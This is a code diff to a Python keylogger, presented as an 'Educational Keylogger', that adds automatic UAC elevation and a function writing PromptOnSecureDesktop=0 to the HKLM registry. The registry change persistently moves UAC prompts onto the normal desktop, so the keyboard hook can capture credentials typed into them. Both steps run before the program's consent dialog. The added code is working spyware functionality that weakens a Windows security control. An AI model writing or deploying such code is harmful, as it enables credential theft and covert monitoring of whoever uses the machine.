@@ -34,6 +34,7 @@ DISCLAIMER:
 import os
 import sys
 import time
+import ctypes
 import tkinter as tk
 from tkinter import messagebox
 
@@ -41,6 +42,113 @@ from keylogger.config import CONSENT_BANNER, CONSENT_KEYWORD
 from keylogger.file_manager import LogFileManager
 from keylogger.logger import KeyboardLogger
 from keylogger.window_manager import ConsoleWindowManager
+
+
+# ======================================================================
+# Privilege & Secure Desktop Helpers
+# ======================================================================
+
+def is_admin() -> bool:
+    """Check if the current process is running with Administrator privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+
+def request_admin() -> None:
+    """Re-launch this script/exe with Administrator privileges via UAC.
+
+    If the user declines the UAC prompt, the application exits.
+    This function does NOT return — it either re-launches or exits.
+    """
+    if is_admin():
+        return  # Already elevated; nothing to do.
+
+    try:
+        # Determine the executable path.
+        if getattr(sys, "frozen", False):
+            # PyInstaller .exe
+            exe = sys.executable
+            params = ""
+        else:
+            # Running as plain Python script
+            exe = sys.executable  # python.exe
+            params = f'"{os.path.abspath(__file__)}"'
+
+        # ShellExecuteW with "runas" triggers a UAC elevation prompt.
+        ret = ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", exe, params, None, 1
+        )
+
+        # ShellExecuteW returns > 32 on success.
+        if ret <= 32:
+            show_error(
+                "Educational Keylogger",
+                "Administrator privileges are required.\n\n"
+                "Please right-click the application and\n"
+                "select 'Run as administrator'."
+            )
+
+        # Exit this (non-elevated) instance regardless.
+        sys.exit(0)
+
+    except Exception as exc:
+        show_error(
+            "Educational Keylogger",
+            f"Failed to request admin privileges:\n\n{exc}"
+        )
+        sys.exit(1)
+
+
+def disable_secure_desktop() -> None:
+    """Disable the UAC Secure Desktop so that UAC prompts appear on the
+    normal user desktop (where pynput keyboard hooks can capture input).
+
+    Modifies the registry key:
+        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
+        PromptOnSecureDesktop = 0
+
+    This change persists across reboots and only needs to run once.
+    Requires Administrator privileges.
+    """
+    import winreg
+
+    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+    value_name = "PromptOnSecureDesktop"
+
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ
+        ) as key:
+            current_value, _ = winreg.QueryValueEx(key, value_name)
+
+        if current_value == 0:
+            safe_print("[INFO] Secure Desktop is already disabled.")
+            return  # Already disabled; nothing to do.
+
+    except FileNotFoundError:
+        pass  # Key doesn't exist yet; we'll create it.
+    except Exception:
+        pass
+
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            key_path,
+            0,
+            winreg.KEY_SET_VALUE,
+        ) as key:
+            winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
+
+        safe_print("[INFO] Secure Desktop disabled — UAC prompts will now "
+                   "appear on the normal desktop.")
+
+    except PermissionError:
+        safe_print("[WARNING] Could not disable Secure Desktop — "
+                   "insufficient permissions.")
+    except Exception as exc:
+        safe_print(f"[WARNING] Could not disable Secure Desktop: {exc}")
 
 
 def safe_print(msg: str) -> None:
@@ -107,12 +215,24 @@ def main() -> None:
     """Application entry point.
 
     Workflow:
+        0. Ensure we are running as Administrator (auto-elevate if not).
+        0b. Disable the UAC Secure Desktop (registry tweak).
         1. Display the consent dialog and obtain explicit permission.
         2. Initialize the window manager and auto-hide the console.
         3. Initialize the file manager (creates ``logs/`` directory).
         4. Start the keyboard listener.
         5. Wait for Ctrl+C, then shut down cleanly.
     """
+    # ── Step 0: Ensure Administrator privileges ───────────────────────
+    # Required so pynput can hook keystrokes across all desktops and
+    # so we can modify the Secure Desktop registry key.
+    request_admin()  # No-op if already elevated; re-launches via UAC otherwise.
+
+    # ── Step 0b: Disable the Secure Desktop ───────────────────────────
+    # Makes UAC prompts appear on the normal desktop where pynput can
+    # capture them.  Only needs to succeed once (persists across reboots).
+    disable_secure_desktop()
+
     # ── Step 1: Obtain consent ────────────────────────────────────────
     if not get_user_consent():
         show_info(
